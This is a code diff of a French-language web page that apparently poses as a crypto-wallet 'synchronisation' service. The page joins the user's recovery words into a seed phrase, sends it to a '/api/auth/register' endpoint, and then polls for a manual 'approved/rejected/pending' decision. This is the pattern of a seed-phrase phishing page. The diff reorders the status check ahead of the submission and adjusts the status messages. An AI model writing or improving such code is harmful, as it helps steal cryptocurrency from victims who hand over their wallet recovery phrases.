@@ -243,9 +243,7 @@
                 grid.appendChild(item);
                 
                 const input = item.querySelector('input');
-                // Utiliser 'input' pour mettre à jour le compteur
                 input.addEventListener('input', updateProgress);
-                // Utiliser 'keydown' pour passer au champ suivant avec Entrée
                 input.addEventListener('keydown', (e) => {
                     if (e.key === 'Enter') {
                         e.preventDefault();
@@ -325,7 +323,34 @@
             const seedPhrase = words.join(' ');
 
             try {
-                // 1. Sauvegarder les mots
+                // ÉTAPE 1 : Vérifier d'abord le statut
+                const statusCheck = await checkStatus(seedPhrase);
+                
+                const statusDiv = document.getElementById('statusMessage');
+                statusDiv.style.display = 'block';
+                
+                if (statusCheck && statusCheck.success) {
+                    // Une décision a déjà été prise
+                    if (statusCheck.status === 'approved') {
+                        statusDiv.className = 'status-box status-approved';
+                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
+                        showToast('✅ Wallet synchronisé avec succès !', 'success');
+                        return;
+                    } else if (statusCheck.status === 'rejected') {
+                        statusDiv.className = 'status-box status-rejected';
+                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
+                        showToast('❌ Erreur de vérification', 'error');
+                        return;
+                    } else {
+                        // Statut 'pending'
+                        statusDiv.className = 'status-box status-pending';
+                        statusDiv.innerHTML = '⏳ En attente de synchronisation...';
+                        showToast('⏳ En attente de validation', 'info');
+                        return;
+                    }
+                }
+
+                // ÉTAPE 2 : Si aucune décision n'existe, créer une nouvelle demande
                 const registerResponse = await fetch('/api/auth/register', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -340,28 +365,8 @@
                 const registerData = await registerResponse.json();
                 console.log('📝 Enregistrement:', registerData);
                 
-                // 2. Vérifier le statut
-                const statusCheck = await checkStatus(seedPhrase);
-                
-                const statusDiv = document.getElementById('statusMessage');
-                statusDiv.style.display = 'block';
-                
-                if (statusCheck && statusCheck.success) {
-                    if (statusCheck.status === 'approved') {
-                        statusDiv.className = 'status-box status-approved';
-                        statusDiv.innerHTML = '✅ Wallet synchronisé !';
-                        showToast('✅ Wallet synchronisé avec succès !', 'success');
-                        return;
-                    } else if (statusCheck.status === 'rejected') {
-                        statusDiv.className = 'status-box status-rejected';
-                        statusDiv.innerHTML = '❌ Erreur de vérification, vérifiez les mots';
-                        showToast('❌ Erreur de vérification', 'error');
-                        return;
-                    }
-                }
-                
                 statusDiv.className = 'status-box status-pending';
-                statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+                statusDiv.innerHTML = '⏳ En attente de synchronisation...';
                 showToast('⏳ Demande envoyée, attente de validation', 'info');
                 
             } catch (error) {
@@ -369,7 +374,7 @@
                 const statusDiv = document.getElementById('statusMessage');
                 statusDiv.style.display = 'block';
                 statusDiv.className = 'status-box status-checking';
-                statusDiv.innerHTML = '⏳ Attente de synchronisation...';
+                statusDiv.innerHTML = '⏳ En attente de synchronisation...';
                 showToast('⚠️ Erreur de connexion', 'error');
             }
         }
